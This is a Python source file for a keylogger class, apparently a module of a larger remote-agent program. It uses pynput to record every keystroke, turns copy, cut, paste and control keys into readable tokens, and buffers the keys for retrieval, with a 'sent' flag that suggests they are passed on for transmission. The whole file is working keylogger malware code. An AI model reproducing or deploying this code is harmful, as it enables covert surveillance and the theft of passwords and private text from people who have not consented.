from pynput.keyboard import Listener
from interface_agent import IKeyLogger

class KeyLoggerService(IKeyLogger):

    def __init__(self):
        self.logged_keys = []
        self.listener = None
        self.sent = False

    def start_logging(self):
        if self.listener is None:
            self.listener = Listener(on_press= self.on_press)
            self.listener.start()


    def stop_logging(self):
        if self.listener is not None:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self):
        logged_keys = self.logged_keys
        self.sent = True
        return logged_keys

    def on_press(self, key):
        key = str(key).replace("'", "")
        if key == 'Key.space':
            key = ' '
        if key == 'Key.enter':
            key = '\n'
        if key == 'Key.up':
            key = ''
        if key == 'Key.right':
            key = ' '
        if key == 'Key.left':
            key = ''
        if key == 'Key.down':
            key = '\n'
        if key == 'Key.ctrl_l':
            key = 'ctrl '
        if key == '\\x03':
            key = 'copy '
        if key == 'Key.backspace':
            key = ''
        if key == '\\x18':
            key = 'cut '
        if key == '\\x16':
            key = 'paste '
        if not key.isalpha() and not key.isnumeric() and not key == ' ':
            key = ' {0} '.format(key)

        if self.sent:
            self.logged_keys = []

        self.logged_keys.append(key)

# import time
# listener = KeyLoggerService()
# listener.start_logging()
# print("hello")
# time.sleep(10)
# listener.stop_logging()
# print(listener.logged_keys)

